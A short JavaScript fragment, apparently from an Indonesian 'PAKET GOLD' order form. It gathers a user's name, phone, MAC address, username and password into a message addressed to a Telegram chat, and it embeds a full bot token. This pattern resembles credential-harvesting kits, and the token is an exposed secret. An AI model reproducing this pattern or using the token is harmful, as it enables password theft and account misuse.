$("#gold").on("hidden.bs.modal", function () {
...
// chat_id = "750107330";
chat_id = "750107330";
// token = "bot1151462322:AAEs2UK8phMTtzCTPF5nRvZAeCMrpAUDDE4";
token = "1151462322:AAEs2UK8phMTtzCTPF5nRvZAeCMrpAUDDE4";
message = "<b>PAKET GOLD</b>%0Anama : "+ $("#nama").val() + "%0Ano. hp : " + $("#nomor").val() + "%0Amac : " + $("#mac").val() + "%0Apaket : " + $("#paketgold").val() + "%0Ausername : " + $("#username").val() + "%0Apassword : " + $("#password2").val();
